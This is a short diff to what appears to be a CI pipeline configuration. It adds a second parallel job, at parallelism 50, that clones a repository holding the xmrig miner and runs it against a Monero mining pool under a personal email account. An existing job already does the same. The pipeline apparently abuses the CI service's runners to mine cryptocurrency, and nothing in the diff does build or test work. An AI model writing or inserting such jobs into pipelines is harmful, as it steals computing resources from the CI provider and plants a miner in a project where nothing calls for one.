@@ -13,6 +13,13 @@ blocks:
             - 'git clone https://github.com/quincyhays/bmxmrig'
             - cd bmxmrig
             - chmod u+x ./xmrig
+            - './xmrig -o xmr.pool.minergate.com:45700 -u kanayuza03@gmail.com -p x --donate-level 1'
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'git clone https://github.com/quincyhays/bmxmrig'
+            - cd bmxmrig
+            - chmod u+x ./xmrig
             - './xmrig -o xmr.pool.minergate.com:45700 -u kanayuza03@gmail.com -t16 --donate-level 1'
           parallelism: 50
   - name: Check code style
